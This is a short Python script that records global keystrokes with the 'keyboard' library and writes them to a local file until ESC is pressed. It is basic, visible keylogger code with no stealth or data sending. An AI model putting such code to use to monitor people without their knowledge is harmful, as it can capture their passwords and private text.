import keyboard

def record_keystrokes():
    try:
        with open("keylogs.txt", "w") as file:
            print("Press ESC to stop recording.")
            while True:
                event = keyboard.read_event()
                if event.name == 'esc':
                    break
                elif event.name in ['space', 'enter']:
                    file.write(f'[{event.name.upper()}]\n')
                else:
                    file.write(event.name)
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    record_keystrokes()